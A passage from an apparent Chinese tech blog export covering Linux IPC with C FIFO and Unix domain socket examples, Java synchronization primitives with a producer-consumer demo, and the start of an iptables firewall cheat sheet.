*filename, mode_t mode | S_IFIFO, (dev_t)0); 返回值：执行成功返回0，失败返回-1，并设置errno 注意这样的方式是在文件系统中创建了一个真实的文件, 可以对其进行读写操作(注意不能同时读写)sender.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;errno.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s fifo_file filename\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int fifo = open(argv[1], O_WRONLY); if(fifo &lt; 0){ perror(&quot;open&quot;); exit(EXIT_FAILURE); } FILE *fp = fopen(argv[2], &quot;rb&quot;); if(fp == NULL){ perror(&quot;fopen&quot;); exit(EXIT_FAILURE); } char buf[BUFSIZ]; int nbuf; while((nbuf = fread(buf, 1, BUFSIZ, fp)) &gt; 0){ write(fifo, buf, nbuf); } fclose(fp); close(fifo); return 0; } receiver.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;errno.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s fifo_file filename\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int fifo = open(argv[1], O_RDONLY); if(fifo &lt; 0){ perror(&quot;fifo&quot;); exit(EXIT_FAILURE); } FILE *fp = fopen(argv[2], &quot;wb&quot;); if(fp == NULL){ perror(&quot;fopen&quot;); exit(EXIT_FAILURE); } char buf[BUFSIZ]; int nbuf; while((nbuf = read(fifo, buf, BUFSIZ)) &gt; 0){ printf(&quot;i got something %s\\n&quot;, buf); fwrite(buf, nbuf, 1, fp); } close(fifo); fclose(fp); return 0; } mkfifo fifo ##使用mkfifo这个命令创建一个管道文件 ./bin/sender fifo /var/log/syslog ###把/var/log/syslog这个文件里面的内容读出来，通过fifo这个文件传到另一个进程。注意到这里卡在这里了 ./bin/receiver fifo syslog.copy ##从管道文件中读取输出，写到syslog.copy文件中.注意到这里读完了之后前面卡住的进程成功退出了 这里还要提到命名管道的安全问题，有可能存在多个进程同时往一个FIFO文件写数据，这样会存在数据顺序错乱的问题。解决方案就是每次写入的数据的大小保持在PIPE_BUF大小以内，要么全部写入，要么一个字节也不写入。 共享内存概念: 什么是共享内存顾名思义，共享内存就是允许两个不相关的进程访问同一个逻辑内存；共享内存是在两个正在运行的进程之间共享和传递数据的一种非常有效的方式；不同进程之间共享的内存通常安排为同一段物理内存，进程可以将同一段共享内存连接到它们自己的地址空间中，所有进程都可以访问共享内存中的地址；而如果某个进程向共享内存写入数据，所做的改动将立即影响到可以访问同一段共享内存的任何其他进程；特别提醒：共享内存并未提供同步机制，也就是说，在第一个进程结束对共享内存的写操作之前，并无自动机制可以阻止第二个进程开始对它进行读取；所以我们通常需要用其他的机制来同步对共享内存的访问，例如信号量、互斥锁； 共享内存的函数接口头文件：sys/types.h、sys/ipc.h、sys/shm.hint shmget(key_t shm_key, size_t shm_size, int shm_flg);：创建共享内存shm_key用来标识一块共享内存：shm_size：输入参数，共享内存的大小（单位：byte）：注意内存分配的单位是页（一般为4kb，可通过getpagesize()获取）；也就是说如果shm_size为1，那么也会分配4096字节的内存；只获取共享内存时，shm_size可指定为0； 程序对信号量的操作都是原子操作，并且只能对它进行等待和发送操作 Unix domain socketsocket原本是为了网络通讯设计的，但是后来在socket的框架上发展出一种IPC机制，就是UNIX Domain Socket；虽然网络socket也可用于同一台主机的进程间通讯（通过loopback地址127.0.0.1），但是UNIX Domain Socket用于IPC更有效率： 不需要经过网络协议栈； 不需要打包拆包； 不需要计算校验和； 不需要维护序号和应答； 这是因为IPC机制本质上是可靠的通讯，而网络协议是为不可靠的通讯设计的；UNIX Domain Socket也提供面向流和面向数据报两种API接口，类似TCP和UDP，但是面向数据报的UNIX Domain Socket也是可靠的，消息既不会丢失也不会顺序错乱；使用UNIX Domain Socket的过程和网络socket十分相似，也要先调用socket()创建一个socket文件描述符，address family指定为AF_UNIX，type可以选择SOCK_STREAM或SOCK_DGRAM，protocol参数仍然指定为0即可；UNIX Domain Socket与网络socket编程最明显的不同在于地址格式不同，用结构体sockaddr_un表示；网络编程的socket地址是IP地址加端口号，而UNIX Domain Socket的地址是一个socket类型的文件在文件系统中的路径，这个socket文件由bind()调用创建，如果调用bind()时该文件已经存在，则bind()错误返回； unix_domain_server.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/un.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/tcp.h&gt; #include &lt;netdb.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;signal.h&gt; #include &lt;sys/wait.h&gt; #define SOCK_PATH &quot;/run/echo.sock&quot; #define BUF_SIZE 1024 int listenfd; void handle_signal(int signo); int main(void){ signal(SIGINT, handle_signal); signal(SIGHUP, handle_signal); signal(SIGTERM, handle_signal); if((listenfd = socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0){ perror(&quot;socket&quot;); exit(EXIT_FAILURE); } struct sockaddr_un servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path, SOCK_PATH); unlink(SOCK_PATH); if(bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)) &lt; 0){ //因为这里要在/var/目录下创建一个临时文件，这个程序需要sudo运行 perror(&quot;bind&quot;); exit(EXIT_FAILURE); } chmod(SOCK_PATH, 00640); if(listen(listenfd, SOMAXCONN) &lt; 0){ perror(&quot;listen&quot;); exit(EXIT_FAILURE); } int connfd, nbuf; char buf[BUF_SIZE + 1]; for(;;){ if((connfd = accept(listenfd, NULL, NULL)) &lt; 0){ perror(&quot;accept&quot;); continue; } nbuf = recv(connfd, buf, BUF_SIZE, 0); buf[nbuf] = 0; printf(&quot;new msg: \\&quot;%s\\&quot;\\n&quot;, buf); send(connfd, buf, nbuf, 0); close(connfd); } return 0; } void handle_signal(int signo){ if(signo == SIGINT){ fprintf(stderr, &quot;received signal: SIGINT(%d)\\n&quot;, signo); }else if(signo == SIGHUP){ fprintf(stderr, &quot;received signal: SIGHUP(%d)\\n&quot;, signo); }else if(signo == SIGTERM){ fprintf(stderr, &quot;received signal: SIGTERM(%d)\\n&quot;, signo); } close(listenfd); unlink(SOCK_PATH); exit(EXIT_SUCCESS); } unix_domain_client.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/un.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/tcp.h&gt; #include &lt;netdb.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;signal.h&gt; #include &lt;sys/wait.h&gt; #define SOCK_PATH &quot;/run/echo.sock&quot; #define BUF_SIZE 1024 int main(int argc, char *argv[]){ if(argc &lt; 2){ fprintf(stderr, &quot;usage: %s msg\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int sockfd; if((sockfd = socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0){ perror(&quot;socket&quot;); exit(EXIT_FAILURE); } struct sockaddr_un servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path, SOCK_PATH); if(connect(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)) &lt; 0){ perror(&quot;connect&quot;); exit(EXIT_FAILURE); } char buf[BUF_SIZE + 1]; int nbuf; nbuf = strlen(argv[1]); send(sockfd, argv[1], nbuf, 0); nbuf = recv(sockfd, buf, BUF_SIZE, 0); buf[nbuf] = 0; printf(&quot;echo msg: \\&quot;%s\\&quot;\\n&quot;, buf); close(sockfd); return 0; } 上述程序实现了通过uninx domain socket的client-server 数据传输，就像是通过/var/echo.sock这个文件传输数据。印象中uwsi也是这样实现nginx和django进程的通信。 总结现在把进程之间传递信息的各种途径（包括各种IPC机制）总结如下：父进程通过fork可以将打开文件的描述符传递给子进程子进程结束时，父进程调用wait可以得到子进程的终止信息几个进程可以在文件系统中读写某个共享文件，也可以通过给文件加锁来实现进程间同步进程之间互发信号，一般使用SIGUSR1和SIGUSR2实现用户自定义功能管道FIFOmmap函数，几个进程可以映射同一内存区SYS V IPC，以前的SYS V UNIX系统实现的IPC机制，包括消息队列、信号量和共享内存，现在已经基本废弃Linux内核继承和兼容了丰富的Unix系统进程间通信（IPC）机制。有传统的管道（Pipe）、信号（Signal）和跟踪（Trace），这三项通信手段只能用于父进程与子进程之间，或者兄弟进程之间；后来又增加了命令管道（Named Pipe），使得进程间通信不再局限于父子进程或者兄弟进程之间；为了更好地支持商业应用中的事务处理，在AT&amp;T的Unix系统V中，又增加了三种称为“System V IPC”的进程间通信机制，分别是报文队列（Message）、共享内存（Share Memory）和信号量（Semaphore）；后来BSD Unix对“System V IPC”机制进行了重要的扩充，提供了一种称为插口（Socket）的进程间通信机制。UNIX Domain Socket是目前最广泛使用的IPC机制 Linux现有的所有进程间IPC方式 管道：在创建时分配一个page大小的内存，缓存区大小比较有限； 消息队列：信息复制两次，额外的CPU消耗；不合适频繁或信息量大的通信； 共享内存：无须复制，共享缓冲区直接付附加到进程虚拟地址空间，速度快；但进程间的同步问题操作系统无法实现，必须各进程利用同步工具解决； 套接字：作为更通用的接口，传输效率低，主要用于不通机器或跨网络的通信； 信号量：常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。 信号: 不适用于信息交换，更适用于进程中断控制，比如非法内存访问，杀死某个进程等； 参考c语言多进程编程","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"c","slug":"c","permalink":"https://haldir65.github.io/tags/c/"}]},{"title":"编程语言中使用到的多线程基础数据结构","date":"2019-01-30T07:53:33.000Z","path":"2019/01/30/2019-01-30-concurrency-primitives-in-programing-languages/","text":"主要讲讲java中的notify,wait,synchronized ，unsafe等多线程基础工具的使用方式。 javawait和notify有一个异常叫做java.lang.IllegalMonitorStateException。意思就是没有在synchronized block中调用wait或者notify方法。java Object中是有一个monitor对象的，wait和notify就是基于这个属性去实现的。只要在同一对象上去调用notify/notifyAll方法，就可以唤醒对应对象monitor上等待的线程了。为什么jvm需要对象的头部信息呢，一是给GC，锁做标记，二是hash数据和分代年龄，三是为了从对象指针就可以会的其数据类型及动态分派的能力，四是数组类型需要有数量信息。 synchronized关键字从语法上讲，synchronized可以用在instance method(锁在这个instance上), static method (锁在这个class )以及method block(锁这一块代码逻辑)。➜ $ cat SynchronizedSample.java package com.me.harris.concurrent; public class SynchronizedSample { public void method() { synchronized (this) { System.out.println(&quot;Method 1 start&quot;); } } } javac SynchronizedSample.javajavap -c SynchronizedSample Warning: Binary file SynchronizedSample contains com.me.harris.concurrent.SynchronizedSample Compiled from &quot;SynchronizedSample.java&quot; public class com.me.harris.concurrent.SynchronizedSample { public com.me.harris.concurrent.SynchronizedSample(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public void method(); Code: 0: aload_0 1: dup 2: astore_1 3: monitorenter ///看这里 4: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 7: ldc #3 // String Method 1 start 9: invokevirtual #4 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 12: aload_1 13: monitorexit //看这里 14: goto 22 17: astore_2 18: aload_1 19: monitorexit 20: aload_2 21: athrow 22: return Exception table: from to target type 4 14 17 any 17 20 17 any } java doc是这么解释的 Each object is associated with a monitor. A monitor is locked if and only if it has an owner. The thread that executes monitorenter attempts to gain ownership of the monitor associated with objectref, as follows:• If the entry count of the monitor associated with objectref is zero, the thread enters the monitor and sets its entry count to one. The thread is then the owner of the monitor.• If the thread already owns the monitor associated with objectref, it reenters the monitor, incrementing its entry count.• If another thread already owns the monitor associated with objectref, the thread blocks until the monitor’s entry count is zero, then tries again to gain ownership.看上去很像c语言里面的semctl嘛。Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的Mutex Lock来实现的。而操作系统实现线程之间的切换这就需要从用户态转换到核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此，这种依赖于操作系统Mutex Lock所实现的锁我们称之为“重量级锁”。JDK中对Synchronized做的种种优化，其核心都是为了减少这种重量级锁的使用。JDK1.6以后，为了减少获得锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。 轻量级锁和偏向锁 类似的，synchronized修饰的instance method在编译后添加了一个ACC_SYNCHRONIZED的flag，同步是通过这个标志实现的。 回顾一下用notify,wait,synchronized实现的生产者-消费者模型Effective java里面说要把wait写在一个while检查里面 // The standard idiom for calling the wait method in Java synchronized (sharedObject) { while (condition) { sharedObject.wait(); //当前线程释放锁，此时 // (Releases lock, and reacquires on wakeup) } // do action based upon condition e.g. take or put into queue } 基本的思路就是生产者和消费者共同持有一个锁（随便new一个Object出来就是了），生产者和消费者都extends Thread。生产者每次生产一个都会notifyAll，消费者每次消费一个都会notifyAll 在Java中，每个对象都有两个池，锁(monitor)池和等待池锁池 :假设线程A已经拥有了某个对象(注意:不是类)的锁，而其它的线程想要调用这个对象的某个synchronized方法(或者synchronized块)，由于这些线程在进入对象的synchronized方法之前必须先获得该对象的锁的拥有权，但是该对象的锁目前正被线程A拥有，所以这些线程就进入了该对象的锁池中。等待池 :假设一个线程A调用了某个对象的wait()方法，线程A就会释放该对象的锁(因为wait()方法必须出现在synchronized中，这样自然在执行wait()方法之前线程A就已经拥有了该对象的锁)，同时线程A就进入到了该对象的等待池中。如果另外的一个线程调用了相同对象的notifyAll()方法，那么处于该对象的等待池中的线程就会全部进入该对象的锁池中，准备争夺锁的拥有权。如果另外的一个线程调用了相同对象的notify()方法，那么仅仅有一个处于该对象的等待池中的线程(随机)会进入该对象的锁池. 也即是被notify的线程都在锁池里(有权竞争cpu)，自己调用wait的线程都在等待池里(无权竞争cpu)。 那么什么时候竞争呢，持有锁的线程自己wait(释放锁)了，那么有权竞争的线程就开始竞争，获得锁的进入同步代码块或者同步方法。 以下代码验证通过 public class Test1 { private static int count = 0; private static final int FULL = 5; private static final String LOCK = &quot;lock&quot;; public static void main(String[] args) { Test1 instance = new Test1(); new Thread(instance.new Producer()).start(); new Thread(instance.new Consumer()).start(); } class Producer implements Runnable{ @Override public void run() { for (int i = 0; i &lt; 10; i++) { synchronized (LOCK){ while (count==FULL){ try{ System.out.println(&quot;PRODUCER WILL WAITING&quot;); LOCK.wait(); System.out.println(&quot;PRODUCER END WAITING&quot;); // 进入 wait()方法后，当前线程释放锁。在从 wait()返回前，线程与其他线程竞争重新获得锁 }catch (Exception e){ e.printStackTrace(); } } count++; System.out.println(Thread.currentThread().getName() + &quot;生产者生产，目前总共有&quot; + count); LOCK.notifyAll();//当前处在wait状态的线程不会马上获得锁 } //退出synchronize代码块之后，程序退出 synchronized 代码块后，当前线程才会释放锁，wait所在的线程也才可以获取该对象锁 } } } class Consumer implements Runnable { @Override public void run() { for (int i = 0; i &lt; 10; i++) { synchronized (LOCK){ while (count==0){ try { System.out.println(&quot;CONSUMER WILL WAITING&quot;); LOCK.wait(); System.out.println(&quot;CONSUMER END WAITING&quot;); // 进入 wait()方法后，当前线程释放锁。在从 wait()返回前，线程与其他线程竞争重新获得锁 } catch (InterruptedException e) { e.printStackTrace(); } } count--; System.out.println(Thread.currentThread().getName()+&quot;消费者消费，当前还剩下&quot;+count+&quot;个&quot;); LOCK.notifyAll(); } } } } } 对应输出如下（输出结果不确定） Thread-0生产者生产，目前总共有1 Thread-0生产者生产，目前总共有2 Thread-0生产者生产，目前总共有3 Thread-0生产者生产，目前总共有4 Thread-0生产者生产，目前总共有5 PRODUCER WILL WAITING //producer线程开始wait，阻塞在这里 Thread-1消费者消费，当前还剩下4个 // 消费者线程进入Synchronized代码块 PRODUCER END WAITING //消费者每次在执行完synchronized代码块都会notifyAll，所以生产者又开始竞争锁，这一次居然抢到了，于是之前的wait返回 Thread-0生产者生产，目前总共有5 //发现满了，重复上面的wait步骤 PRODUCER WILL WAITING //释放锁 Thread-1消费者消费，当前还剩下4个 //锁被别人抢到 PRODUCER END WAITING //别人notify导致我抢到了锁 Thread-0生产者生产，目前总共有5 PRODUCER WILL WAITING Thread-1消费者消费，当前还剩下4个 PRODUCER END WAITING Thread-0生产者生产，目前总共有5 PRODUCER WILL WAITING Thread-1消费者消费，当前还剩下4个 PRODUCER END WAITING Thread-0生产者生产，目前总共有5 PRODUCER WILL WAITING Thread-1消费者消费，当前还剩下4个 PRODUCER END WAITING Thread-0生产者生产，目前总共有5 //生产者最后一次生产 Thread-1消费者消费，当前还剩下4个 Thread-1消费者消费，当前还剩下3个 Thread-1消费者消费，当前还剩下2个 Thread-1消费者消费，当前还剩下1个 Thread-1消费者消费，当前还剩下0个 从代码执行顺序来看，wait方法调用后，当前线程阻塞住(虽然还在一个同步代码块中，直到别的线程notify，这个wait方法才会返回)，此时另一个线程竞争获取锁开始执行同步代码块。 Thread.sleep并不释放锁，只是让出cpu执行时间Thread.sleep和Object.wait都会暂停当前的线程，对于CPU资源来说，不管是哪种方式暂停的线程，都表示它暂时不再需要CPU的执行时间。OS会将执行时间分配给其它线程。区别是，调用wait后，需要别的线程执行notify/notifyAll才能够重新获得CPU执行时间。所以在同步代码块里执行sleep是一个很糟糕的做法 yield的用法yield是让当前线程从running的状态变成runnable的状态（不过这个方法很少用到） join的用法和python一样，主线程调用childThread.join()就是让主线程等子线程执行完了之后再去执行后面的语句。不过从源码来看,join调用了wait。 public final void join() throws InterruptedException { join(0); //这里面调用了wait方法，也就是主线程会wait住 } public synchronized void start() { //Thread的start方法中做了相应的处理，所以当join的线程执行完成以后，会自动唤醒主线程继续往下执行 } 调用join的线程总得被唤醒啊 stackoverflow上说是在native层面调用的notify。有人翻出来openjdk的cpp源码 void JavaThread::run() { ... thread_main_inner(); } void JavaThread::thread_main_inner() { ... this-&gt;exit(false); delete this; } void JavaThread::exit(bool destroy_vm, ExitType exit_type) { ... // Notify waiters on thread object. This has to be done after exit() is called // on the thread (if the thread is the last thread in a daemon ThreadGroup the // group should have the destroyed bit set before waiters are notified). ensure_join(this); ... } static void ensure_join(JavaThread* thread) { // We do not need to grap the Threads_lock, since we are operating on ourself. Handle threadObj(thread, thread-&gt;threadObj()); assert(threadObj.not_null(), &quot;java thread object must exist&quot;); ObjectLocker lock(threadObj, thread); // Ignore pending exception (ThreadDeath), since we are exiting anyway thread-&gt;clear_pending_exception(); // Thread is exiting. So set thread_status field in java.lang.Thread class to TERMINATED. java_lang_Thread::set_thread_status(threadObj(), java_lang_Thread::TERMINATED); // Clear the native thread instance - this makes isAlive return false and allows the join() // to complete once we&#39;ve done the notify_all below java_lang_Thread::set_thread(threadObj(), NULL); lock.notify_all(thread); // Ignore pending exception (ThreadDeath), since we are exiting anyway thread-&gt;clear_pending_exception(); } 答案就在lock.notify_all(thread);这里 锁的实现java中的锁一共有4种状态，级别从低到高分别是： 无锁状态 偏向锁 轻量级锁 重量级锁 偏向锁：顾名思义，为了让线程获得锁的代价更低，引入了偏向锁。加锁当一个线程访问同步块并且获取锁时，会在对象头和栈帧中的锁记录里存储锁偏向的线程id，这样，这个线程便获取了这个对象的偏向锁，之后这个线程进入和退出就不需要通过CAS操作，也就是原子操作，来进行加锁和解锁，只需要简单的测试下对象头存储的偏向锁的线程id是否和自身的id一致，如果一致，那么已经获取锁，直接进入。否则，判断对象中是否已经存储了偏向锁，如果没有锁，那么使用CAS竞争锁，如果设置了，那么尝试使用CAS将对象头的偏向锁指向当前线程。解锁偏向锁的解锁时机是在竞争时才会释放锁,撤销时需要等待全局安全点，这个时间点没有正在执行的字节码，首先会暂停拥有偏向锁的线程，然后检查偏向锁的线程是否存活，如果不活动，那么直接设置为无锁状态。否则要么偏向其他锁，要么恢复到无锁或者标记对象不适合偏向锁。 轻量锁会自旋尝试获取锁，消耗cpu资源加锁一旦多线程发起了锁竞争，并且释放了偏向锁之后，线程通过CAS修改Mark Word，如果当前没有对象持有同步体的锁，那么直接将同步体的锁修改的轻量锁，否则，该线程将自旋获取锁，直到膨胀为重量级锁，修改同步体的Mark Word为重量级锁，然后阻塞解锁一旦有其他线程因想获取当前锁而膨胀为重量级锁，那么这个线程将会通过CAS替换Mark Word，然后失败，解锁，并且唤醒其他等待线程。 重量级锁会阻塞，不消耗cpu资源，但是响应时间较慢synchronized内部也是利用了锁。每一个对象都有一个自己的monitor，必须先获取这个monitor对象才能够进入同步块或同步方法，而这个monitor对象的获取是排他的，也就是同一时刻只能有一个线程获取到这个monitor 图解java并发unSafe hacknoon中有关于python中多线程primitives的文章c语言中多线程通信基础基本的思想都是相通的 参考美团博客中关于java锁的一片文章openjdk是如何读取.class文件的AQS这个java并发基础类的实现原理","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"iptables速查手册","date":"2019-01-29T11:46:11.000Z","path":"2019/01/29/2019-01-29-iptables-cheatsheet/","text":"iptables是控制linux 内核netfilter的command line frontend tool，只存在于linux平台，是system admin常用的防火墙。(虽然已经被nftables取代了，学习点网络知识还是很有必要) iptables的manpage这么写的 DESCRIPTIONIptables and ip6tables are used to set up, maintain, and inspect the tablesof IPv4 and IPv6 packet filter rules in the Linux kernel. Several differenttables may be defined. Each table contains a number of built-in chains andmay also contain user-defined chains.Each chain is a list of rules which can match a set of packets. Each rulespecifies what to do with a packet that matches. This is called a `target’,which may be a jump to a user-defined chain in the same table. 概念:iptables命令需要root权限执行每个表包含有若干个不同的链，比如 filter 表默认包含有 INPUT，FORWARD，OUTPUT 三个链。iptables有四个表，分别是：raw，nat，mangle和filter，每个表都有自己专门的用处，比如最常用filter表就是专门用来做包过滤的，而 nat 表是专门用来做NAT的。 Chain默认的Chain包括 INPUT —&gt; 所有进入这台主机的连接 FORWARD —&gt; 借由这台主机发出的（路由器） OUTPUT —&gt; 所有从这台主机发出去的连接 PREROUTING / POSTROUTING 每一条Chain上都有一个rules的列表(用A去append,用I去Insert) table（table是一系列针对packet的同一类决策的集合）Mangle is to change packets (Type Of Service, Time To Live etc) on traversal.Nat is to put in NAT rules.Raw is to be used for marking and connection tracking.Filter is for filtering packets. #~ iptables -L INPUT -n -v --line-numbers Chain INPUT (policy DROP) num target prot opt source destination 1 DROP all -- 202.54.1.1 0.0.0.0/0 2 DROP all -- 202.54.1.2 0.0.0.0/0 3 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state NEW,ESTABLISHED 执行顺序(这个比较麻烦): iptables执行规则时，是从从规则表中从上至下顺序执行的，如果没遇到匹配的规则，就一条一条往下执行，如果遇到匹配的规则后，那么就执行本规则，执行后根据本规则的动作(accept, reject, log等)，决定下一步执行的情况。比如说上面这个，拉黑了202.54.1.2虽然第三条规则说全部接受，其实202.54.1.2的包是进不来的。这也是很多教程建议把自己的iptables写在后面的原因，不要把系统现有规则覆盖掉。 iptables -L -n -v //查看已添加的iptables规则 默认是全部接受的 Chain INPUT (policy ACCEPT) ## 允许进入这台电脑 target prot opt source destination Chain FORWARD (policy ACCEPT) ## 路由相关 target prot opt source destination Chain OUTPUT (policy ACCEPT) ## 允许发出这台电脑 target prot opt source destination 允许所有连接iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT iptables后面可以跟的参数很多 # iptables -t mangle -X # iptables -P INPUT ACCEPT # iptables -P OUTPUT ACCEPT # iptables -P FORWARD ACCEPT 来解释一下这些参数的意思-L List rules的意思 -v verbose -n numeric 不走dns，直接显示ip,这样会快一点 -F flushing（删除）所有的rules -X delete chain -t table_name(一般就nat和mangle两种) -P 设置policy(比如说DROP , REJECT, REDIRECT) --line-numbers //显示每条规则所在的行号 -s source iP -i interface，就是eth0这些网卡设备什么的 --dport destination端口 ，比方说80 LOG --log-prefix &quot;IP_SPOOF A: &quot; //加日志,这个LOG关键词和DROP,ACCEPT都差不多的，跟在-j 屁股后面 -m mac --mac-source //-m 我猜是metrics ，就是说根据哪种评判标准，这里是mac地址 -m state --state NEW,ESTABLISHED -j ACCEPT -p tcp protocol之类的，比方说tcp,udp,icmp(ping)等等 拉黑一个ip iptables -I INPUT -s xxx.xxx.xxx.xxx -j DROP //这个拉黑的效果是tcp,udp,icmp全部不通。对方的curl,ping全部卡住 DROP是直接不回话了，REJECT则是会给对方发一个 ACK/RST （这跟不回应对方是有区别的）REJECT differs to DROP that it does send a packet back, but the answer is as if a server is located on the IP, but does not have the port in a listening state. IPtables will sent a RST/ACK in case of TCP or with UDP an ICMP destination port unreachable.(对方收到后，看起了就像是这台http服务器没有listen在80端口上一样)在互联网的服务器上，拉黑别人一般都是用DROP，因为没必要再去通知对方已被拉黑。 取消拉黑：也就是删除上面这条规则 iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP 比方说我不小心把202.54.1.1拉黑了，怎么挽回 iptables -L OUTPUT -n --line-numbers | grep 202.54.1.1 //发现在条规则第四行 iptabels -D INPUT 4 //把这个第四行的规则删掉 iptables -D INPUT -s 202.54.1.1 -j DROP //这个也是一样的 只允许特定ip访问某个端口 sudo iptables -I INPUT -p tcp ! -s 200.200.200.0/24 –destination-port 1080 -j DROP 上面说了，iptables的顺序是从上往下match，前面的如果匹配上了，后面的就不会有机会被匹配。所以假如第2条规则说全部接受，我想拉黑某个ip，就得用-I，把拉黑的规则插入到最前面（-I 1 就是插入到第一位）:iptables -I 1 INPUT -s xxx.xxx.xxx.xxx -j DROP iptables -P FORWARD DROP ## 把forward 一律改为drop（走本机代理的包全部丢掉） iptables -A INPUT -s 192.168.1.3 ## A是append s是source，拒绝接受192.168.1.3的访问，就是黑名单了 iptables -A INPUT -s 192.168.0.0/24 -p tcp --destination-port 25 -j DROP ## block all devices on this network , p是protocol,SMTP一般是25端口 iptables -A INPUT -s 192.168.0.66 -j ACCEPT ## 白名单 iptables -D INPUT 3 ##这个3是当前INPUT链的第3条规则，就是说删掉这个chain里面的第3条规则 iptables -I INPUT -s 192.168.0.66 -j ACCEPT ## 白名单，和-A不同，A是加到尾部，I是加到list的头部，顺序很重要。 iptables -I INPUT -s 123.45.6.7 -j DROP #屏蔽单个IP的命令 iptables -I INPUT -s 123.0.0.0/8 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令 iptables -I INPUT -s 124.45.0.0/16 -j DROP #封IP段即从123.45.0.1到123.45.255.254的命令 public interface（对外提供服务的网卡应该把私有的ip拉黑掉）//假如你的某个公共网卡专门对外服务，ip嗅探没什么的，但是下面这种私有ip号段应该禁止。non-routable source addresses的包都可以被DROP掉（就是说拒绝局域网内设备192.168.x.x就不要想着访问这台主机的eth1网卡了） 具体来说，这些都是保留的私有ip地址 iptables -A INPUT -i eth1 -s 192.168.0.0/24 -j DROP 10.0.0.0/8 -j (A) 172.16.0.0/12 (B) 192.168.0.0/16 (C) 224.0.0.0/4 (MULTICAST D) 240.0.0.0/5 (E) 127.0.0.0/8 (LOOPBACK) // See Wikipedia and RFC5735 for full list of reserved networks. #允许所有本机向外的访问 iptables -A OUTPUT -j ACCEPT # 允许访问22端口 iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问80端口 iptables -A INPUT -p tcp --dport 80 -j ACCEPT #允许访问443端口 iptables -A INPUT -p tcp --dport 443 -j ACCEPT #允许FTP服务的21和20端口 iptables -A INPUT -p tcp --dport 21 -j ACCEPT iptables -A INPUT -p tcp --dport 20 -j ACCEPT #如果有其他端口的话，规则也类似，稍微修改上述语句就行 #允许ping iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT #禁止其他未允许的规则访问 iptables -A INPUT -j REJECT #（注意：如果22端口未加入允许规则，SSH链接会直接断开。） iptables -A FORWARD -j REJECT CIDR（比如说封掉facebook.com）# host -t a www.facebook.com www.facebook.com has address 69.171.228.40 # whois 69.171.228.40 | grep CIDR CIDR: 69.171.224.0/19 //就是说facebook的网端在69.171.224.0/19这个范围里 # iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j DROP // 这台主机没法上facebook了 # ping www.facebook.com ping: sendmsg: Operation not permitted(就是被发出去的包被iptables拦下来了) //上面这堆看起来挺麻烦的 iptables -A OUTPUT -p tcp -d www.facebook.com -j DROP //直接搞定,但是不推荐这么干 根据某个mac地址指定# iptables -I INPUT -m mac --mac-source 3E:D7:88:A6:66:8E -j ACCEPT # iptables -I INPUT -p tcp --dport 22 -m mac --mac-source 3E:D7:88:A6:66:8E -j ACCEPT # iptables -I INPUT -p tcp --dport 22 -m mac --mac-source 3E:D7:88:A6:66:8E -j REJECT # iptables -I INPUT -p tcp --port 22 -m mac ! --mac-source 3E:D7:88:A6:66:8E -j REJECT //除了特定mac以外都不允许访问 # iptables -A INPUT -m mac --mac-source 00:0F:EA:91:04:08 -j DROP 不允许别人ping我# iptables -A INPUT -p icmp --icmp-type echo-request -j 